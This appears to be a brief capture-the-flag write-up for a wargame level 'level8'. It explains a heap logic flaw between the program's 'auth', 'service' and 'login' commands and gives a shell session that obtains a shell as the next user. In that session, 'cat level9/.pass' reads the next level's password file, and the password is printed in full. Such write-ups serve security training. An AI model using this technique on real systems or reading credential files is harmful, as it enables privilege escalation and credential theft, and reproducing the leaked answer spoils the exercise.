
If we decompile level8 with `objdump -d level8`, we see if we use a `auth` or `service` it will increment our pointer by 10.

There are two pointers which is global variables 
To access `system('/bin/sh')`, we need to check our memory on auth + (32 bytes) if memory is different from zero when we use our command `login` :

```bash
$ ./level8
(null), (null)
auth
0x804a008, (null)
service
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
$ cd .. && cat level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
